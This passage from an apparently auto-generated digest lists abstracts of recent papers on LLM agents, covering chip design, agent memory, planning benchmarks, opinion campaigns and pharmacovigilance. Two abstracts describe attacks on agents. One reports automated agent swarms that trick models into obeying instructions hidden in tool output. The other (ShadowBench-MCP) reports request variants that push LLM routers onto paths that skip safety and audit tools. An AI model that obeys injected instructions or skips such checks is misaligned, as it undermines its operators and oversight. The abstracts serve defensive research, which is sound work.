Electronic design automation (EDA) workflows remain highly fragmented, requiring engineers to coordinate heterogeneous representations, specialised software tools, and iterative verification across multiple design stages. Although large language models have brought more general reasoning and code-generation capabilities to EDA, many existing approaches remain focused on isolated tasks and struggle to plan, verify, and repair designs autonomously within executable engineering environments. Here we introduce ChipOmni, a knowledge-enhanced, context-evolving AI agent framework for EDA. ChipOmni integrates multimodal understanding, dynamic planning, multi-agent collaboration, and verification-driven tool interaction into a unified autonomous system. By continually incorporating feedback from external engineering tools, the framework maintains an evolving task context, integrates domain knowledge, and iteratively refines intermediate designs. Across benchmarks for analog circuit, RTL, testbench, and formal-assertion generation, ChipOmni improves multiple task-specific measures over the evaluated baselines and solves all 30 AnalogCoder-Pro tasks. In a long-horizon case study, ChipOmni advances a natural-language RISC-V specification through three design levels to a micro-SoC GDSII layout that passes physical sign-off, without human intervention after initialization. Together, these results show that ChipOmni can coordinate verification-driven design across heterogeneous tasks and sustain long-horizon engineering workflows, advancing a shift from fragmented, tool-centred processes towards agent-centred, closed-loop systems.

</details>


### 155. Can LLM Agents Organize Their Own Memory?

- **Authors:** Zichuan Fu, Junjia Qi, Wenlin Zhang, Yimin Deng, Shirong Wang, Jinyang Li, Xian Wu, Xiangyu Zhao
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.11929v1](http://arxiv.org/abs/2611.11929v1)
- **PDF:** [https://arxiv.org/pdf/2611.11929v1](https://arxiv.org/pdf/2611.11929v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

In most LLM agents, weights are fixed after deployment, so new information must be retained in external memory. Existing approaches often rely on predefined records and fixed organizational rules, which cannot readily accommodate evolving tasks and interactions. This raises the question: can LLM agents organize their own memory using ordinary documents? We introduce self-organized memory (SoMem), a framework that stores memory in linked documents. The agent decides what to summarize, how to group related information, and when to revise existing topics, and every summary it produces stays linked to the original interactions as evidence. The runtime validates updates and automatically derives temporal, relational, and recent-memory views from the organized content. At query time, the agent chooses what to search and read, following document links and inspecting original evidence as needed. On LoCoMo, BEAM-100K, and LongMemEval-S, SoMem outperforms the strongest baseline by 2.66, 3.10, and 2.00 percentage points, respectively. The constructed memory can be reused across models, and additional reasoning effort can further improve answer quality. These findings demonstrate the feasibility of agents organizing and using their own persistent memory through ordinary documents. Code is available at: https://github.com/Qi202/SoMem.

</details>


### 156. Late but Valuable: Why Deadlines Change the Measured Value of LLM Reasoning

- **Authors:** Sina Barazandeh, Benjamin E. Lundell, Jose Lugo-Martinez
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.11910v1](http://arxiv.org/abs/2611.11910v1)
- **PDF:** [https://arxiv.org/pdf/2611.11910v1](https://arxiv.org/pdf/2611.11910v1)
- **Categories:** cs.LG, cs.AI, cs.DC


> Summary unavailable.


<details>
<summary>Abstract</summary>

Large language models (LLMs) increasingly plan and run experiments in automated laboratories. These experiments keep running while the model reasons and run on schedules with hard deadlines. If an LLM-generated answer arrives late, the system executes a safe fallback action instead, such as rejecting a sample. This creates a systems problem that standard serving metrics do not capture. An answer that matches the fallback adds no value, and answers that differ from the fallback may require more reasoning time. Reporting answer quality and latency separately can therefore overstate the value of reasoning. We test this on synthetic sample decisions, where the best choice is known exactly and a runtime enforces the deadline. We compare one LLM's fast mode, which answers directly, with its thinking mode, which reasons first. In a prespecified replay of 1,200 new decisions, thinking answers that missed a deadline were worth about five times as much as on-time ones. Multiplying the on-time rate by the mean answer value predicted about twice the value that thinking delivered. This prediction overstated thinking's advantage over fast mode by 0.0241 per decision, and by 0.0191 in a repeat on 300 new decisions. Both 95% confidence intervals excluded zero. In a single-GPU Qwen3-8B experiment using simultaneous request bursts, raising the number of requests from 8 to 56 reduced the share of thinking answers that met a 45 s deadline from 79.2% to 1.4%, although total output tripled. Evaluations of LLM agents for laboratories should therefore measure each answer's value and arrival time together and score the action that actually runs.

</details>


### 157. Competing Influence in LLM Populations: Budget Timing and Baseline Drift

- **Authors:** Mehwish Nasim, Nicolas Fay
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.11867v1](http://arxiv.org/abs/2611.11867v1)
- **PDF:** [https://arxiv.org/pdf/2611.11867v1](https://arxiv.org/pdf/2611.11867v1)
- **Categories:** physics.soc-ph, cs.CL, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

When competing campaigns target a population of large language model (LLM) agents, observed opinion changes may reflect both campaign influence and changes that would occur without intervention. We study how the timing of campaign expenditure and the population's own evolution shape outcomes in a network of persona-conditioned LLM agents that exchange and revise opinions in natural language. A proponent and a challenger are tasked with generating opposing messages under equal delivery budgets, while a separate stance probe measures opinions without influencing the simulation. Across eight claims, we compare single-campaign and competitive conditions against matched no-campaign runs, and evaluate all nine combinations of early, sustained, and late spending on a reference topic. Baseline stance drift varies substantially across claims and, on some, accounts for a sizeable fraction of apparent campaign effects. After accounting for this drift, the direction of observed campaign-associated changes aligns more closely with the claim's epistemic standing than with the campaigner's assigned role. Uninfluenced populations also consistently lose stance diversity, demonstrating that directional opinion change and convergence are distinct phenomena. In networks with two opinion-segregated communities, campaigns primarily reduce differences between communities rather than diversity within them. LLM campaign agents do not always argue for their assigned positions, particularly when these conflict with established evidence. Finally, campaign outcomes depend on the opponent's expenditure schedule: unlike a matched numerical bounded-confidence population receiving interventions at the same times and locations, the LLM population exhibits a payoff structure with no pure-strategy equilibrium.

</details>


### 158. Scaling Adaptive Prompt Injection Attacks with Agent Swarms

- **Authors:** Alexey Kurakin, Vishal Karande, Alex Bie, Chongyang Shi, Shuang Song, Saeed Mahloujifar, Abdullatif Köksal, Jamie Hayes, Juliette Pluto, Yinghao Sun, Kamalika Chaudhuri
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.11861v1](http://arxiv.org/abs/2611.11861v1)
- **PDF:** [https://arxiv.org/pdf/2611.11861v1](https://arxiv.org/pdf/2611.11861v1)
- **Categories:** cs.CR, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Prompt injections have emerged as one of the top security risks faced by AI agents today. Early work in prompt injection attacks looked at simple tool-call agents and static attack payloads, and were saturated since mid-2025. As of Fall 2026, human red-teaming may be nearing saturation, especially on the Gemini family of models. In this work, we argue that despite this apparent plateau, prompt injection attacks are still possible and continued effort into prompt injection defense is needed.
  We design a new synthetic evaluation dataset which uses random non-malicious actions as adversarial goals. Such dataset design helps us to evaluate prompt injection robustness as a model ability to respect instruction hierarchy, and disentangle this ability from model knowledge of security practices. We show that an agentic attacker of increased capabilities can reliably trick model to follow instructions in tool output in our evaluation, even for models previously considered robust on public prompt injection benchmarks such as GraySwan Arena. This shows that current frontier defenses may require proactive, automated red-teaming to remain resilient to increasingly capable adversaries.

</details>


### 159. From Questions to Decisions: Benchmarking How LLM Agents Acquire Decision-Relevant Information from Human Beings

- **Authors:** Yuhan Tang, Ke Fan, Xinkai Zou, Baichuan Mo, Kangxin Cui, Ao Qu, Ou Zheng, Jiangbo Yu, Haris N. Koutsopoulos, Jinhua Zhao, Yuan Zhou
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13015v1](http://arxiv.org/abs/2611.13015v1)
- **PDF:** [https://arxiv.org/pdf/2611.13015v1](https://arxiv.org/pdf/2611.13015v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

LLM agents are increasingly asked to make plans for people, such as scheduling drivers or assigning nurses. However, people's requests are often incomplete, and the supporting information for decision-making may be outdated, requiring agents to ask for clarification. Existing benchmarks typically provide fully specified problems or rely on uncalibrated LLM-simulated users, leaving this ability insufficiently tested. We introduce Ask2Decide, a benchmark of 43 planning tasks that evaluates whether agents ask for missing information that matters for their decisions. An operator holds facts absent from the agent's request and records, and optimization solvers determine which facts change the optimal plan. We also include similarly worded facts that leave the optimal plan unchanged to test whether agents distinguish useful information from irrelevant details. We collect 79 interaction sessions from 19 participants and find that, after an incorrect plan, human replies omit the correcting fact far more often than replies from an uncalibrated simulated user (43% versus 7%). Using these interactions, we calibrate a simulated operator that more closely matches human reply patterns. Evaluating four frontier LLMs, we find that their initial plans are infeasible on 58-98% of tasks when information is missing, compared with 5-28% when all facts are provided upfront. Agents uncover facts that change the optimal plan only slightly more often than facts that leave it unchanged (39-52% versus 32-41%). These results show that obtaining decision-relevant information through interaction remains a major bottleneck for LLM planning. This is ongoing work and will be updated. The date of this version is shown on the first page.

</details>


### 160. Publications as benchmarks: auditing AI agents on spatial transcriptomics alignment

- **Authors:** Yiqun T. Chen, Jan Matthias, Jianing Yao, Hongyu Eric Zhao, Stephanie C. Hicks
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.11796v1](http://arxiv.org/abs/2611.11796v1)
- **PDF:** [https://arxiv.org/pdf/2611.11796v1](https://arxiv.org/pdf/2611.11796v1)
- **Categories:** q-bio.GN, cs.AI, stat.AP


> Summary unavailable.


<details>
<summary>Abstract</summary>

AI agents are increasingly automating data analysis, but responsible adoption requires reliable performance evaluation, which is costly in specialized scientific domains. We introduce a framework that translates scientific publications into auditable benchmarks for AI agents and demonstrate its use on spatial transcriptomics alignment tasks. Across 121 tasks, 16 baseline methods, and six AI agents, the best agents (GPT-6-Astra and Gemini-4-Argon) matched or outperformed all baselines on 80% of tasks, often using surprisingly simple heuristics. Agent performance was robust to prompting and access to pre-installed packages. Benchmark construction also uncovered errors in prior work and shortcuts in current evaluation metrics. Finally, we show that agent-generated solutions can be distilled into a reusable program that ranks in the top 10% of baseline methods on unseen data. Our framework offers a scalable way to evaluate AI agents in specialized scientific domains by leveraging and stress-testing existing papers and metrics.

</details>


### 161. ShadowBench-MCP: Measuring Shadow Invocations in MCP-Style Tool Routing

- **Authors:** Eyhab Al-Masri, Wenjun Yang
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.11720v1](http://arxiv.org/abs/2611.11720v1)
- **PDF:** [https://arxiv.org/pdf/2611.11720v1](https://arxiv.org/pdf/2611.11720v1)
- **Categories:** cs.CR, cs.AI, cs.MA, eess.SY


> Summary unavailable.


<details>
<summary>Abstract</summary>

LLM agents increasingly act as routers for tools, APIs, and software-supply-chain workflows, making an execution path - rather than generated text alone - a security-relevant model output. We study shadow invocation: a task-preserving request variant that causes an LLM router to select a riskier execution path, potentially skipping validation, provenance, staging, redaction, or audit controls even though the request does not ask for a malicious action. We introduce ShadowBench-MCP, a benchmark and metric suite that separates task preservation (TPSS), operational pressure (OPSS), and route-geometric drift (RGAS), and combines them in the pre-execution SODS score. In a focused policy-ablation study using a Groq-hosted qwen/qwen3-32b router, 120 routing decisions yield 96 original-versus-variant comparisons across six security-sensitive workflows. Efficiency-first routing produces a 29.2% shadow-invocation rate and 26.7% safety-tool skip rate. Policy-aware routing reduces these to 4.2% and 1.7%, respectively, corresponding to an 85.7% relative reduction in shadow invocations. Pre-execution signals distinguish shadow routes with ROC AUC up to 0.94. These results are early, single-router evidence of a policy-dependent routing-layer security effect, not a claim of universal vulnerability.

</details>


### 162. Steering Emergent Behavior in Multi-Agent LLM Systems via Information Networks

- **Authors:** Sepehr Ilami, Babak Heydari
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.11714v2](http://arxiv.org/abs/2611.11714v2)
- **PDF:** [https://arxiv.org/pdf/2611.11714v2](https://arxiv.org/pdf/2611.11714v2)
- **Categories:** cs.MA, cs.AI, cs.GT, cs.SI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Large language model (LLM) agents increasingly operate in groups, each pursuing an individual objective while jointly determining system performance. If an operator controls which agent observes which other agent, but not their payoffs or messages, how should observations be structured to raise collective welfare? We make the information network (who observes whom) a design object, decoupled from the fixed interaction network over which agents act. Ten identical LLM agents play repeated group-decision games; by default each observes only an anonymous summary of the group's previous-round outcome, and a manager with a fixed budget adds directed observation links that reveal peers' past actions. Across 1,080 episodes and six games spanning coordination, anti-coordination, social dilemmas, and discovery, we ask how much information to share and, at a fixed budget, who should observe whom. Disclosure creates behavioral coupling: observation acts as a contagion channel whose welfare effect depends on the alignment between individually attractive behavior and the collective objective. First, the value of information is alignment-contingent: more peer information tends to help or be neutral when individual behavior is aligned with the collective goal, but under free-riding or congestion externalities it amplifies collectively harmful behavior; in a public-goods game the group does best with no information at all. We read this sign separation as a cross-game regularity within one controlled LLM population, not a model-invariant law. Second, at a fixed budget, who observes whom matters primarily when coupling is harmful: a modular "barbell" that lets sub-populations entrench harmful behavior is reliably the worst wiring, reversing the network-reciprocity intuition from human evolutionary game theory. These results argue against a default of full transparency for agent collectives.

</details>


### 163. CASCoDe: A Closed-Loop Agentic Framework for Analog Sizing and Layout Co-Design

- **Authors:** Ziming Wei, Bingyang Liu, David Z. Pan
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.11710v1](http://arxiv.org/abs/2611.11710v1)
- **PDF:** [https://arxiv.org/pdf/2611.11710v1](https://arxiv.org/pdf/2611.11710v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Expert analog layouts differ from auto-generated ones in density and regularity, not only in legality: experts make a succession of discrete, hierarchical physical decisions and revisit each after extracted electrical results, while most existing automated flows act on a physical search space fixed before the controller runs. We present CASCoDe, a closed-loop LLM agent framework for analog netlist-to-layout design that formalizes those expert decisions as a hierarchical discrete action space-sizing selection, structural floorplan, local layout refinement, routing-attempt selection-on which the agent runs feedback-driven tree search from a circuit netlist to a verified GDS. The agent authors the circuit-specific floorplans and scripts, and an execution layer of interface adaptations over adapted tools make every action land at physical implementation and be judged by DRC, LVS, and extracted-RC simulation. On 20 SKY130 amplifiers spanning single-, two-, and three-stage topologies, CASCoDe is the only flow that delivers a DRC- and LVS-clean routed layout when meeting design specifications for every circuit. It reduces area by 59-85% (mean 71%) against a conventional P&R flow on identical PCells, raises mean device density from 0.39 to 0.74 against APPlace, MAGICAL, ALIGN and ICPI. A layout that beats every baseline in area and legality appears after 11 minutes of agent time on average, and ablations show that the structured action space and the feedback-guided tree search each reduce area and search cost.

</details>



## Medrxiv (1 papers)


### 1. Automating postmarketing pharmacovigilance with large language model agents

- **Authors:** Zhang, R., Zhou, Y., Chui, C. S. L., Yu, D., Wu, Z., Luo, R.
- **Published:** 2026-11-12
- **Source:** medrxiv
- **URL:** [https://doi.org/10.64898/2026.11.10.26367711](https://doi.org/10.64898/2026.11.10.26367711)

- **Categories:** health informatics


> Summary unavailable.


<details>
<summary>Abstract</summary>

Postmarketing pharmacovigilance relies on spontaneous adverse event reporting and labor-intensive observational studies, which suffer from underreporting and delayed risk detection. Large language model (LLM) agents could automate real-world evidence generation, but generalist agents make ad hoc analytical decisions that compromise epidemiological validity and reproducibility. Here we present MedCheckpoint, a multi-agent LLM system for automated postmarketing pharmacovigilance. MedCheckpoint grounds each analytical stage in a curated, source-traceable medical knowledge base, locks core study-design parameters before execution, performs patient-level analyses with human-written deterministic statistical tools, and enforces checkpoint rules that abort infeasible analyses, with optional human-in-the-loop review. We evaluated MedCheckpoint using a 54-question benchmark on a dual-purpose simulated electronic health record (EHR) testbed of 2.7 million individuals, designed with reliable clinical signals to evaluate routine analytical accuracy alongside spurious signals to stress-test system rigor. Across the benchmark, MedCheckpoint outperformed two coding-agent baselines in report quality across five dimensions rated by three independent LLM judges (overall means 4.81-4.88 versus 4.25-4.55 and 4.02-4.29) and yielded higher run-to-run consistency (mean within-question standard deviation 0.116-0.186 versus up to 0.440). Crucially, while baselines failed on up to 2 of 21 runs when handling infeasible comparisons or unmeasurable outcomes, MedCheckpoint produced no misleading failures across all seven stress-test trap questions with known data limitations. MedCheckpoint enables reliable, auditable, and scalable pharmacovigilance analysis.

</details>






---
*Generated by [agentpaper_reporter](https://github.com/your-repo/agentpaper_reporter)*